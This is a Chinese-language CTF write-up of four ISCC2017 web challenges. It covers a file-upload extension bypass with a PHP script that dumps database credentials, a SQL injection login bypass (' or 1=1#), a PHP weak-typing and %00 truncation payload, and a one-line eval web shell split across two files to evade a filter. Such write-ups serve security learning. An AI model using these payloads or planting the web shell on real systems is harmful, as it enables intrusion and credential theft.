---
title: WP for ISCC2017_WEB
categories: [CTF]
tags: [CTF, Writeup, WEB, ISCC2017, 文件上传, SQL注入, PHP弱类型]
---

## WelcomeToMySQL

> Description: Welcome to MySQL! SQL inject?

最初看这道题目的名称及描述以为是一道SQL注入的题目，但打开链接后，发现是文件上传，上传后的文件将会放在**upload**目录。

查看网页源码，发现有提示：

	hint:$servername,$username,$password,$db,$tb is set in ../base.php

访问`http://139.129.108.53:8081/web-01/base.php`，返回一个空页面，status=200，说明文件存在。

接下来的思路就比较明显，通过上传php文件，包含**base.php**文件，然后获得MYSQL数据库的用户名、密码等相关信息。

网站应该对文件的后缀名进行了过滤，当上传`.php`后缀文件的时候，上传会失败。`.php5`的文件后缀一样会被PHP解析执行（这里有一些[文件上传漏洞参考](https://xianzhi.aliyun.com/forum/mobile/read/672.html)），更改文件后缀为`.php5`，文件上传成功。上传文件内容如下：

``` php
<?php
	include "../base.php";
	echo $servername,$username,$password,$db,$tb;
?>
```

可以得到数据库相应的信息：

	localhostiscc2017iscc2017flagflag

数据库地址、用户名等信息都已经得到，起初想通过MYSQL客户端直接连接远程服务器，但是连接失败。转念一想，可以直接在PHP文件中读取数据库的内容，最终php代码如下：

``` php
<?php

	include "../base.php";
	echo $servername,$username,$password,$db,$tb;

	$conn = new mysqli($servername, $username, $password, $db);
	$sql = "SELECT * from $tb";
	$result = $conn->query($sql);
	while ($row = $result->fetch_assoc()) {
		foreach($row as $item)
			echo "<br>" . $item;
	}
	$conn->close();
?>
```

拿到FLAG：

	Flag:{Iscc_1s_Fun_4nd_php_iS_Easy}
---

## 我们一起来日站

> Description：老司机发挥所长，利用平时拿站的技巧来解题吧

拿到FLAG只需要两步，而且题目环境异常粗暴简单，。

### robots.txt文件目录泄露

进入首页后，先要进入后台，但是不知道后台在哪里，一番搜索发现存在robots.txt，内容如下：

``` 
#
# robots.txt 
#
User-agent: * 
Disallow: /21232f297a57a5a743894a0e4a801fc3/
Disallow: /api

```

显然第一个奇奇怪怪的字符串应该是我们寻找的目录，进入目录，提示：

>  keep finding admin page!

根据提示，继续深入，试探网址页面：

	http://139.129.108.53:5090/web-04/21232f297a57a5a743894a0e4a801fc3/admin.php

进入网站后台管理页面。

### 简单SQL注入

后台仅仅给出两个输入框，随便输入内容会给出`Wrong password!`的提示，尝试在第二个输入框内输入单引号`'`，返回错误信息：

	Error selecting database:
此处利用单引号`'`闭合之后，可以随便注入，没有进行什么过滤。构造的FORM提交内容如下：

	username=a&password=' or 1=1#

拿到FLAG：

	Flag:{ar32wefafafqw325t4rqfcafas}
---

## 自相矛盾

> Description：打破常规，毁你三观！

这道题目一共设置了PHP的几个坑，但基本上都可以通过PHP的**弱类型**绕过，此外还有**`%00`截断**等技巧。

首先看题目直接给出的PHP源码：

``` php
$v1=0;$v2=0;$v3=0;
$a=(array)json_decode(@$_GET['iscc']); 

if(is_array($a)){
    is_numeric(@$a["bar1"])?die("nope"):NULL;
    if(@$a["bar1"]){
        ($a["bar1"]>2016)?$v1=1:NULL;
    }
    if(is_array(@$a["bar2"])){
        if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope");
        $pos = array_search("nudt", $a["bar2"]);
        $pos===false?die("nope"):NULL;
        foreach($a["bar2"] as $key=>$val){
            $val==="nudt"?die("nope"):NULL;
        }
        $v2=1;

    }	
}
$c=@$_GET['cat'];
$d=@$_GET['dog'];
if(@$c[1]){
    if(!strcmp($c[1],$d) && $c[1]!==$d){
		
        eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
        strpos(($c[0].$d), "isccctf2017")?$v3=1:NULL;
		
    }
	
}
if($v1 && $v2 && $v3){ 
   
   echo $flag;
}
```

最后要使得`$v1`、`$v2`、`$v3`得值均为真，就可以拿到FLAG，这几处是比较独立的几个绕过，下面一个一个分析。

### 矛盾一：string转int绕过

要让`$v1=1`要满足两个条件：

- `is_numeric(@$a["bar1"])`为假
- `$a["bar1"]>2016`为真

也就是说`$a["bar1"]`既不能是个数字，又要大于2016。令此变量中含有字母，就会判断不是数字，`is_numeric`为假；当此含有字母的字符串与整型数字进行比较的时候，这就要考虑到PHP中**string**向**int**的转换：**PHP会将字符串中开头的数字取出，转换为数字，剩余字母被丢弃**。举个例子：`"2017dffd"`->`2017`；`"abcdkj"`->`0`。

所以此处绕过，只需：

	$$a["bar1"]="2017and"

### 矛盾二：依然string转int绕过

根据`if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope");`，将`$a["bar2"]`构造成一个五个元素数组，其中第一个元素为数组。下面来到了关键点：

``` php
	$pos = array_search("nudt", $a["bar2"]);
	$pos===false?die("nope"):NULL;
	foreach($a["bar2"] as $key=>$val){
            $val==="nudt"?die("nope"):NULL;
```

这段代码要求`$a["bar2"]`中含有元素`"nudt"`（array_search函数返回为真），但同时下面又要求`$val === "nudt"`不能为真。注意到下面的等于判断是**严格等于**，而**arrat_search**的类型判断同样是不严格的，所以还是通过string转int绕过，在`$a["bar2"]`中包含一个元素`0`，就可以了。因为array_search同样在将`"nudt"`与整型`0`比较的时候，会将`"nudt"`转换成`0`，所以`0==0`，array_search函数可以返回为真，但下面的严格等于是类型严格的，不会返回为真。

最终构造`$a["bar"]`值：

	$a["bar2"] = [[1,2],2,3,4, 0];

### 矛盾三：利用数组和%00截断绕过

下面是第三个矛盾：`!strcmp($c[1],$d) && $c[1]!==$d`，要求`$c[1]`,`$d`这两个变量在**strcmp**函数中相等，又严格不等。strcmp函数首先要将比较的参数转换成string类型，因此这里可以用到**Array类型**，Array类型在转换成String时会转换成一个常量字符串`"Array"`，所以可以让`$c[1]=Array()`，`$d="Array"`。这样就能够绕过这一检测。

紧接着下面一个矛盾是下面两行代码：

	eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
	strpos(($c[0].$d), "isccctf2017")?$v3=1:NULL;
要求`$d.$c[0]`中不含字符`3|1|c`，但是有要求`$c[0].$d`中含有字符串`isccctf2017`，注意到字符串拼接的时候，两个字符串的顺序正好相反，所以想到使用**%00截断**，将`%00`添加到`$d`的末尾截断字符串（`$d`不含字符`3|1|c`）、将`"isccctf2017"`包含在变量`$c[0]`中，就可以同时满足上面两条语句。

### 最终payload

综上所述，我们能够将能够满足`echo $flag;`的条件，还要注意`$a`是从url的GET参数`iscc`中JSON解码得出的，因此字符串`$a`要通过参数`iscc`以JSON的格式传递。

As a result:

	?iscc={"bar1":"2017anc","bar2":[[1,2],2,3,4,0]}&cat[0]=1isccctf2017&cat[1][]=1&dog=Array%00

得到FLAG：

	flag{sfklljljdstuaft}

### 总结

综合上面的几个矛盾的绕过，其实我们可以看到核心都在PHP的**弱类型**上，正是由于数组转String，string转int等一系列的弱类型转换中出现的各种性质，结合**严格相等**和**严格不等**的严格类型检测，才能使得上面一系列两个看似矛盾的语句都能够满足。

---

## I have a jpg,i upload a txt.

这是一道文件上传的题目，此题关键有二：

- 猜解其加密函数
- 绕过上传文件内容限制

首先是猜解其加密函数，我们可以看到其自定义的加密函数名大致为**KAISA**，并且发现其函数传入了一个参数6。因此猜测是偏移为6的凯撒加密，猜测基本正确。实际上又稍微绕了一点，小写字母与大写字母的偏移方向是相反的，其他字符则保持不变。

猜解出了加密函数之后，就可以自己上传文件并构造Array的**serial**更改文件的后缀了，到这里我们已经可以上传文件并将其更改为php后缀。

下一步是文件内容的绕过。代码中限制了`<?`，`php`这种关键字，正常情况下比较难以绕过，但通过研究其代码可以发现其逻辑漏洞。在文件重命名的处理中，首先保证了Array的长度为2；接着又判断Array的key值：0则是改变的文件后缀，否则则是写入value值对应文件名的文件内容。此处存在一个逻辑漏洞：

可以构造这样一个Array：`array(1=>value1, 2=>value2)`，此处value1，value2为我们之前上传的两个文件名，就可以把两个文件的内容拼接起来，从而绕过过滤。可以使用一句话木马:

```php
<?=eval($_POST['cmd']);
```

，并分成两个文件：

- File1：<
- File2：?=eval($_POST['cmd']);

成功后执行上传的php文件会进行302跳转，FLAG就在302跳转时所传送的信息中。